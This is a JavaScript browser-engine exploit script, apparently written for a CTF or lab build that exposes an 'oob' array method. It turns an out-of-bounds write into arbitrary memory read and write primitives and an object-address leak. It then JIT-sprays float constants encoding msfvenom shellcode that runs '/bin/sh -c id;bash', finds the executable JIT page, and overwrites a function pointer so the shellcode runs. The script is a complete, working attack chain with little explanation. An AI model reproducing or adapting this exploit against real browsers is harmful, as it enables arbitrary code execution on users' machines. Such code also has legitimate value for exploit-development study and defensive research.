var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2) 
*/
function itof(val) { // typeof(val) = BigInt
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

// function dump(badBuf, size) {
//   for (let i = 0; i < size; i++) {
//     console.log(`${i}: ${badBuf[i].toString(16)}`)
//   }
// }

var tmp_vuln = new Array(8);

var abuf = new ArrayBuffer(8);
abuf = new BigUint64Array(abuf);

var bbuf = new ArrayBuffer(8);
tmp_vuln.oob(15, itof(0xdeadn)); // abuf.length == 0xdead

// abuf[0] = 0x4141414141414141n; // tag for debugging

// in bbuf we search the "elementsData" pointer
bbufType = new BigUint64Array(bbuf);
// bbufType[0] = 0x4242424242424242n; // tag for debugging

function read64(addr) {
  // write "addr" in bbuf->elementsData
  abuf[7] = addr;
  // create u64 array with bbuf->elementsData
  return new BigUint64Array(bbuf)[0];
}

function write64(addr, value) {
  // write "addr" in bbuf->elementsData
  abuf[7] = addr;
  // create u64 array with bbuf->elementsData and write to [0]
  new BigUint64Array(bbuf)[0] = value
}

function addrOf(obj_to_leak) {
  // put obj_to_leak in bbuf new prop
  bbuf.leak = obj_to_leak;

  // read "bbuf->slots" to get address
  var addr = read64(abuf[5]) & 0xffffffffffffn; // mask to pointer tagging
  return addr;
}

// https://vulndev.io/shellcode-converter/
function shellcode() {
  EGG = 5.40900888e-315;          // 0x41414141 in memory, marker to find
  C01 = -6.828527034422786e-229;  // 0x9090909090909090
// msfvenom -p linux/x64/exec CMD="/bin/sh -c 'id;bash'" -f byte
  C02 = 6.867659397734779e+246     
  C03 = 7.806615353364766e+184
  C04 = 2.541954188459429e-198
  C05 = 3.2060568060029287e-80
  C06 = 3.4574612453438036e+198
  C07 = 7.57500810708945e-119
  C08 = 1.0802257739008538e+117
  C09 = -6.828527034370483e-229    
}

// JIT shellcode
for (let i = 0; i < 100000; i++) {
  shellcode();
}

shellcode_addr = addrOf(shellcode);
console.log("Shellcode addr: 0x" + shellcode_addr.toString(16));
while(shellcode_addr == addrOf(shellcode)){
    // just block until we get the updated addr 
}

// get JSFunction address
shellcode_addr = addrOf(shellcode);

// get jitInfo of JSFunction object (JSFunction.u.native.extra.jitInfo_)
jitinfo = read64(shellcode_addr + 0x28n);
// follow jitInfo address to found exec page 
rx_region = read64(jitinfo & 0xffffffffffffn);

// find shellcode in this memory
target = rx_region;
for (let i = 0; i < 0x800; i++) {
  data = read64(target);
  if (data == 0x41414141n) {
    target += 8n;
    break;
  }
  target += 8n;
}

// replace function pointer to shellcode
write64(jitinfo, target);
// call shellcode
shellcode()